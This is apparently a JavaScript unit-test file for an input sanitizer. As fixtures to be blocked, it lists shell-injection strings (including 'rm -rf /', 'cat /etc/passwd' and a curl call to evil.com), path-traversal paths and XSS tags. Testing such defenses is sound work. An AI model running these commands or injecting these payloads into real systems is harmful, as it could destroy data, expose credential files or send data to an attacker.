// SECURITY VALIDATION TESTS
import { test } from 'node:test';
import assert from 'node:assert';
import SecuritySanitizer from '../src/security/sanitizer.js';

test('Input sanitization - command injection prevention', () => {
  const sanitizer = new SecuritySanitizer();

  const maliciousInputs = [
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    '| cat /etc/passwd',
    '&& curl evil.com'
  ];

  for (const input of maliciousInputs) {
    const result = sanitizer.sanitizeProjectName(input);
    assert(!result.includes(';'), 'Semicolons should be removed');
    assert(!result.includes('$'), 'Dollar signs should be removed');
    assert(!result.includes('|'), 'Pipes should be removed');
    assert(!result.includes('&'), 'Ampersands should be removed');
  }
});

test('Path traversal prevention', () => {
  const sanitizer = new SecuritySanitizer();

  const dangerousPaths = [
    '../../../etc/passwd',
    '/etc/passwd',
    '..\\..\\windows\\system32'
  ];

  for (const path of dangerousPaths) {
    assert.throws(
      () => sanitizer.sanitizeFilePath(path),
      /Path traversal attempt blocked/,
      'Should block path traversal attempts'
    );
  }
});

test('Circular reference detection', () => {
  const sanitizer = new SecuritySanitizer();

  const circular = { name: 'test' };
  circular.self = circular;

  const result = sanitizer.detectCircularReferences(circular);
  assert.strictEqual(result.self, '[Circular Reference Detected]');
});

test('XSS prevention', () => {
  const sanitizer = new SecuritySanitizer();

  const xssInputs = [
    '<script>alert("xss")</script>',
    '<iframe src="evil.com"></iframe>',
    '<object data="malicious.swf"></object>'
  ];

  for (const input of xssInputs) {
    const result = sanitizer.sanitizeProjectName(input);
    assert(!result.includes('<script>'), 'Script tags should be removed');
    assert(!result.includes('<iframe>'), 'Iframe tags should be removed');
    assert(!result.includes('<object>'), 'Object tags should be removed');
  }
});